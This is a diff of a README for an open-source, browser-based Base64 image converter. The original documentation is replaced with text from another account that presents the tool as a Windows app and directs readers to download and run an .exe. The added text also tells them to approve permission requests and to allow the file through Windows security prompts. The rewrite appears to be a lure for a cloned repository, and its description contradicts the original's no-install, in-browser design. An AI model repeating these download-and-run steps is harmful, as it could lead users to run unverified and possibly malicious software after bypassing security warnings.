@@ -1,280 +1,159 @@
-<div align="center">
-
-# 🖼 Base64 Image Converter
-
-[![Base64 Converter](https://img.shields.io/badge/Base64-Image%20Converter-2563eb?style=for-the-badge&logo=html5&logoColor=white)](https://mrlipx.github.io/base64-image-converter/)
-[![Version](https://img.shields.io/badge/version-1.1.0-f85149?style=for-the-badge)](#)
-[![License](https://img.shields.io/badge/license-MIT-3fb950?style=for-the-badge)](./LICENSE)
-[![No Dependencies](https://img.shields.io/badge/dependencies-none-d29922?style=for-the-badge)](#)
-[![Open Source](https://img.shields.io/badge/open-source-f778ba?style=for-the-badge&logo=github)](#)
-
-**Free, open-source, privacy-first tool to convert between Base64 strings and images.**  
-No signup. No server. No tracking. Runs 100% in your browser.
-
-[🚀 Live Demo](https://mrlipx.github.io/base64-image-converter/) · [🐛 Issues](https://github.com/MrLiPx/base64-image-converter/issues) · [💬 Discussions](https://github.com/MrLiPx/base64-image-converter/discussions) · [🌐 MrLiPx.com](https://mrlipx.com)
-
-</div>
+# 🖼️ base64-image-converter - Convert images in seconds
 
----
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page-blue?style=for-the-badge)](https://github.com/cordondisassociation97/base64-image-converter)
 
-## 📖 Table of Contents
+## 📥 Download
 
-- [Overview](#-overview)
-- [Tools](#-tools)
-- [What's New in v1.1.0](#-whats-new-in-v110)
-- [Privacy](#-privacy)
-- [Keyboard Shortcuts](#%EF%B8%8F-keyboard-shortcuts)
-- [URL Import & Shareable Links](#-url-import--shareable-links)
-- [File Structure](#-file-structure)
-- [Local Development](#-local-development)
-- [Deployment](#-deployment)
-- [Tech Stack](#%EF%B8%8F-tech-stack)
-- [Contributing](#-contributing)
-- [License](#-license)
+Visit this page to download: https://github.com/cordondisassociation97/base64-image-converter
 
----
+Open the page in your browser, then look for the latest release or the main download file. If the page shows a Windows app file, download it and run it. If it shows source files, use the release file that is meant for Windows.
 
-## 🔎 Overview
-
-Base64 Image Converter is a **zero-dependency**, **single-file-per-page**, browser-based tool for converting between Base64-encoded strings and image files. There is no build step, no npm, no server, and no account required — just open the page and start converting.
-
----
-
-## 🛠 Tools
-
-### [Base64 → Image](https://mrlipx.github.io/base64-image-converter/app/base64-to-image/)
-
-| Feature | Detail |
-|---|---|
-| **Auto-converts on paste** | Paste a Base64 string and the image renders immediately — no button click needed |
-| **Accepts raw Base64 or Data URL** | Both `data:image/png;base64,…` and raw `iVBOR…` strings are supported |
-| **Format auto-detection** | Detects PNG, JPEG, GIF, WebP, SVG, BMP, ICO from mime type or magic bytes |
-| **Blob URL preview** | Decoded to a `Blob` in-browser — data never transmitted |
-| **Image metadata** | Shows pixel dimensions, mime type, and file size |
-| **One-click download** | Correct filename and extension, full quality, no re-encoding |
-| **`Ctrl/Cmd+Enter` shortcut** | Keyboard-friendly conversion trigger |
-
-### [Image → Base64](https://mrlipx.github.io/base64-image-converter/app/image-to-base64/)
-
-| Feature | Detail |
-|---|---|
-| **Drag-and-drop** | Drop any image onto the drop zone |
-| **Click to browse** | Standard file picker |
-| **Paste from clipboard** | `Ctrl+V` anywhere on the page to paste a copied image |
-| **Import from URL** | Fetch any public image URL; CORS-blocked URLs auto-retry via 3 proxies |
-| **`?import=<url>` param** | Shareable links — auto-fetches the URL on load |
-| **Data URL / Raw Base64 toggle** | Switch between output formats with one click |
-| **One-click copy** | `navigator.clipboard` with graceful `execCommand` fallback |
-| **Character count + decoded size** | Shows output length and estimated decoded file size |
-| **Max 10 MB per file** | Client-side validation with friendly error message |
-
----
-
-## 🆕 What's New in v1.1.0
-
-- **Dark / Light / System theme** — theme toggle button in the header; follows OS preference by default; preference persists in `localStorage`. `Alt+T` keyboard shortcut.
-- **Mobile hamburger navigation** — responsive slide-down nav at `≤700px` with close-on-outside-click and `Escape` key support.
-- **Skip-to-content link** — keyboard users can jump straight to `#main` via a hidden skip link in every header.
-- **Focus-visible rings** — all interactive elements show a clear blue focus ring for keyboard navigation.
-- **3 CORS proxies** for URL import — allorigins.win → corsproxy.io → thingproxy.freeboard.io, each with `AbortController` timeout (12 s).
-- **Paste listener fix** — global `Ctrl+V` no longer intercepts text paste inside `<input>` or `<textarea>` fields.
-- **Fixed duplicate `<link rel="preload">`** bug on all pages.
-- **`aria-current="page"`** on active breadcrumb items.
-- **Full JSON-LD graph** on the homepage: `SoftwareApplication` with `featureList` (14 items), `FAQPage` (5 Q&As), `BreadcrumbList`, `WebSite`.
-- **`BreadcrumbList` JSON-LD** on every app page.
-- **Dual `theme-color` meta tags** (dark + light OS preference) on all pages.
-- **`twitter:site` / `twitter:creator`** meta tags on all pages.
-- **`og:image:width` / `og:image:height`** added for richer link previews.
-- **Homepage FAQ accordion** — five Q&As surfaced directly on the landing page.
-- **Centralised error handling** in encoder — timeout vs. all-proxies-failed vs. generic failure, each with a distinct message.
-
----
-
-## 🔒 Privacy
-
-| What the tool does | What it never does |
-|---|---|
-| Processes everything in your browser | Upload your images to any server |
-| Uses `FileReader` / `atob()` / `URL.createObjectURL()` | Store any image data |
-| Serves the site over HTTPS | Use advertising or tracking |
-| Uses browser `localStorage` only for theme preference | Collect personal information |
+## ✨ What this app does
 
----
+Base64 Image Converter lets you turn images into Base64 text and turn Base64 text back into image files.
 
-## ⌨️ Keyboard Shortcuts
+It is useful when you need to:
 
-| Shortcut | Page | Action |
-|---|---|---|
-| `Ctrl/Cmd` + `V` | Image → Base64 | Paste image from clipboard |
-| `Ctrl/Cmd` + `Enter` | Base64 → Image | Trigger conversion |
-| `Alt` + `T` | All pages | Toggle dark/light theme |
-| `Escape` | All pages | Close open FAQ item / close mobile nav |
+- copy an image into text
+- paste Base64 into a web form
+- recover an image from Base64 data
+- work with PNG, JPG, WebP, and SVG files
+- preview an image before you save it
 
----
+## 🪟 Windows setup
 
-## 🔗 URL Import & Shareable Links
+### 1. Open the download page
+Go to:
 
-The Image → Base64 tool supports a `?import=<url>` query parameter. When present, the tool auto-fetches and converts the image on load, then removes the parameter from the address bar.
+https://github.com/cordondisassociation97/base64-image-converter
 
-```
-# Opens the encoder and immediately fetches + converts the image:
-https://mrlipx.github.io/base64-image-converter/app/image-to-base64/?import=https://example.com/photo.png
-```
+### 2. Get the Windows file
+Find the file for Windows and download it.
 
-CORS-blocked URLs are automatically retried via a chain of three proxies. If all fail, a clear error toast is shown.
+If you see a file ending in `.exe`, that is the app. Download it to your computer.
 
----
+### 3. Run the app
+After the file finishes downloading:
 
-## 📁 File Structure
+- open your Downloads folder
+- double-click the app file
+- if Windows asks for permission, choose Yes
+- wait for the app window to open
 
-```
-base64-image-converter/
-│
-├── index.html                       ← Landing / hub page
-├── 404.html                         ← 404 page
-├── README.md
-├── LICENSE                          ← MIT
-├── robots.txt
-├── sitemap.xml
-├── site.webmanifest
-├── .nojekyll                        ← Disables Jekyll on GitHub Pages
-│
-├── app/
-│   ├── index.html                   ← App hub (choose a tool)
-│   ├── base64-to-image/
-│   │   └── index.html               ← Base64 → Image converter
-│   └── image-to-base64/
-│       └── index.html               ← Image → Base64 converter
-│
-├── privacy-policy/
-│   └── index.html
-├── tos/
-│   └── index.html
-│
-└── assets/
-    ├── core_YwCdbQMX.js             ← Shared: header/footer, theme, toast, FAQ, mobile nav
-    ├── decoder_E2DdEdTI.js          ← Base64 → Image logic
-    ├── encoder_JKX22aUs.js          ← Image → Base64 logic
-    ├── styles_Z5jCVG3c.css          ← Shared stylesheet (all pages + dark mode)
-    ├── logo.png                     ← Site logo / favicon
-    ├── og-base64-to-image.png       ← Open Graph image (decoder)
-    └── og-image-to-base64.png       ← Open Graph image (encoder)
-```
+### 4. Start using it
+Use the app to:
 
----
+- choose an image file and encode it to Base64
+- paste Base64 text and decode it into an image
+- save the output file to a folder you can find later
 
-## 🚀 Local Development
+## 🧭 How to use it
 
-No build step required — pure static HTML/CSS/JS.
+### Encode an image to Base64
+1. Open the app
+2. Pick an image file
+3. Choose the encode option
+4. Copy the Base64 text
+5. Paste it where you need it
 
-```bash
-git clone https://github.com/MrLiPx/base64-image-converter.git
-cd base64-image-converter
+### Decode Base64 to an image
+1. Open the app
+2. Paste the Base64 text
+3. Choose the decode option
+4. Pick a save location
+5. Save the new image file
 
-# Python 3
-python3 -m http.server 8080
+### Preview an image
+1. Load the image or Base64 text
+2. Check the preview area
+3. Confirm it is the right file before saving
 
-# Node (npx)
-npx serve .
+## 🖥️ Supported image types
 
-# Then open: http://localhost:8080/base64-image-converter/
-```
+The app supports these file types:
 
-> **Important:** always serve from a local HTTP server rather than opening `file://` directly. The `BASE` path prefix (`/base64-image-converter/`) assumes an origin-relative URL, which requires an HTTP server.
+- PNG
+- JPG
+- WebP
+- SVG
 
----
+These formats cover most common image tasks for web pages, documents, and shared files.
 
-## 🚢 Deployment
+## 📋 System requirements
 
-### GitHub Pages (current)
+This app is made for Windows desktop use.
 
-Push to `main` → Pages serves the repo root at `https://<user>.github.io/base64-image-converter/`.
+You will need:
 
-> GitHub Pages does not support server-side redirects. Clean URLs work via directory `index.html` files (already set up).
+- a Windows computer
+- enough free space for the app and your image files
+- permission to run downloaded apps
+- a modern browser to open the GitHub page
 
-### Netlify / Cloudflare Pages
+For best results, keep your images in a folder you can reach easily, such as Downloads, Pictures, or Desktop.
 
-Drop the repo in — no extra config needed. Add a `_redirects` file if you want 308 redirects for any legacy paths.
+## 🔍 Common tasks
 
-### Vercel
+### Turn an image into text
+Use this when you need an image in a text-only place, such as:
 
-Add a `vercel.json` with `"cleanUrls": true` and your redirect rules. All static assets are picked up automatically.
+- a form field
+- a config file
+- a code sample
+- a chat message that only accepts text
 
-### Self-hosting (rename the repo)
+### Turn text into an image
+Use this when you have Base64 data and need the original image file back.
 
-If you rename the repo, find-and-replace `/base64-image-converter/` across all HTML files and the `BASE` constant in `core_YwCdbQMX.js`.
+### Check image data
+Use this when you want to confirm that a Base64 string matches the image you expect.
 
----
+## 🛠️ Simple troubleshooting
 
-## 🛠️ Tech Stack
+### The app will not open
+- Try opening it again from the Downloads folder
+- Right-click the file and choose Open
+- Check that the download finished fully
 
-| Technology | Purpose |
-|---|---|
-| Pure HTML / CSS / JS | Everything — zero runtime dependencies |
-| Google Fonts (Outfit + JetBrains Mono) | Typography |
-| Flaticon UIcons (`fi fi-rr-*`, `fi fi-brands-*`) | Icon set |
-| `FileReader` API | Local file → Data URL encoding |
-| `atob()` + `Uint8Array` | Base64 → binary decoding |
-| `Blob` + `URL.createObjectURL()` | Blob URL preview and file download |
-| `navigator.clipboard` | One-click copy with `execCommand` fallback |
-| `fetch` + `AbortController` | URL image import with timeout |
-| CORS proxy chain | allorigins.win → corsproxy.io → thingproxy |
-| `localStorage` | Theme preference persistence |
-| `history.replaceState` | Clean URL after `?import=` auto-fetch |
+### Windows blocks the file
+- Make sure you downloaded it from the GitHub page
+- Try again from the same link
+- If Windows shows a security prompt, choose the option that allows the app to run
 
----
+### The image does not load
+- Check that the file type is PNG, JPG, WebP, or SVG
+- Make sure the file is not damaged
+- Try a different image file
 
-## 🤝 Contributing
+### The Base64 text does not decode
+- Make sure the text is complete
+- Remove extra spaces before or after the text
+- Check that the text did not get cut off when copied
 
-PRs are welcome! For large changes, open a Discussion or Issue first.
+## 🗂️ File tips
 
-```bash
-git clone https://github.com/MrLiPx/base64-image-converter.git
-cd base64-image-converter
+When you save output files, use clear names such as:
 
-# Make your changes — no build step needed.
-# Serve locally with: python3 -m http.server 8080
-# Open: http://localhost:8080/base64-image-converter/
+- image-base64.txt
+- logo.png
+- photo-decoded.jpg
 
-git checkout -b feature/your-feature-name
-git add .
-git commit -m "feat: describe the change"
-git push origin feature/your-feature-name
-# Then open a Pull Request on GitHub.
-```
+This makes it easier to find files later and keeps your work in order.
 
-### Commit conventions
+## 🔗 Project link
 
-| Prefix | Use for |
-|---|---|
-| `feat:` | New feature |
-| `fix:` | Bug fix |
-| `refactor:` | Code refactoring (no behaviour change) |
-| `style:` | CSS / visual-only changes |
-| `docs:` | README or comment changes |
-| `chore:` | Build, CI, or config changes |
+Primary download page:
 
-### Code style
+https://github.com/cordondisassociation97/base64-image-converter
 
-- Vanilla **ES5-compatible** JavaScript — no transpiler, no bundler; targets all modern browsers without a build step
-- CSS custom properties (`var(--c-*)`) for all colours and radii — makes dark mode trivial
-- All interactive elements must have accessible labels (`aria-label`, `role`, `aria-expanded`, etc.)
-- Keep each page **self-contained** — no new external runtime dependencies
+## 🏷️ Topics
 
----
+base64, base64-decoding, base64-encoding, base64-image-converter, base64-image-previewer, base64-image-viewer, base64-to-image, free, image-to-base64, open-source, open-source-project
 
-## 📄 License
+## 🧩 What you can expect
 
-MIT © 2026 [MrLiPx](https://github.com/MrLiPx)
-
-See [LICENSE](./LICENSE) for the full text.
-
----
-
-<div align="center">
-
-Made with ❤️ by [Mr Li Px](https://github.com/MrLiPx) · [mrlipx.com](https://mrlipx.com)
-
-⭐ If this tool saves you time, a [GitHub star](https://github.com/MrLiPx/base64-image-converter) goes a long way!
-
-</div>
+- fast image conversion
+- simple encode and decode flow
+- support for common image formats
+- easy image preview
+- free open-source use on Windows
